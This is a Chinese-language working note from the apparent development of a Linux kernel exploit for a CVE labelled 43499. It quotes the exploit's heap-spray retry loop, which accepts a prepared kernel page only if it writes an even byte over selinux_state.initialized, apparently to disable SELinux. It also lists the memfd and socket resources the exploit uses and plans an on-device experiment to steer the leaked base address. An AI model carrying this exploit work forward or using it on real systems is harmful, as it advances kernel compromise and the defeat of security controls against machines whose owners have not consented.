# 43499 · 退役的重试循环与我同形，差别在"清得干不干净"（round 130）

## 退役的循环（spray.cpp:682-727 逐字 ✓）

```cpp
for (attempt = 1..max_attempts) {
    base = prepare_kernel_page(&request);          // 每次重新准备
    if (!matches) pr_warning("payload arm mismatch preserve_child=%d right=%016zx");
    else if (!accepts_page) pr_warning("page %016zx stores an even byte over selinux_state.initialized;
                                       taking another", base);      // ★ 奇偶判据：**完全同规则** ✓
    else { pr_info("prepare_kernel_page ok attempt=%u +%lldms"); return base; }
    if (超时) break;   pr_warning("prepare_kernel_page retry %u/%u");
}
```

⇒ 结论 1：**结构与我的循环一致** ✓（重新准备 + 同一条奇偶判据 + 不合格再来 ✓）；
⇒ 结论 2：归档显示 `prepare_kernel_page ok attempt=1` ✓ ⇒ **退役第一个 base 就合格** ✓、重试几乎不用；
⇒ 结论 3：所以"我总拿同一块"的差别不在循环 ✗，而在**"重新准备时到底清掉了什么"** ✗。

## 资源清单（本树 prepare 持有 ✓）

```
core/src/backend/cve_2026_43499/memory/prepare_page.hpp：
  shaping_fd / shaping_peer_fd（**交给调用方** ✓）
  pre_fds[] / spray_fds[] / post_fds[]（每 pid 一个 memfd ✓）
  leak_fd
  以及 ctx 存储与 skb_buffer（退役靠 cleanup_page_prepare_state 释放 ✓）
```

## 开放问题（下一个实验，可测 ✓）

同一次重试里：**上一轮的 memfd/映射留着 vs 全部关掉**，下一次 `prepare` 给出的 `base` 会不会变 ✗？
⇒ 这是一个**单变量真机实验**（两步各跑一次、比较 `base` 的 bit16 分布 ✓）：

1. 变体 A：重试前**不关**上一轮的 pre/spray/post/leak（现状 ✗）⇒ 记 base；
2. 变体 B：重试前**全关**（等价退役 cleanup）⇒ 记 base；
3. 判据：B 的 base 是否出现与 A 不同的 bit16 ✓（若不同 ⇒ 找到杠杆 ✓；若相同 ⇒ 再往下看泄漏源 ✓）。
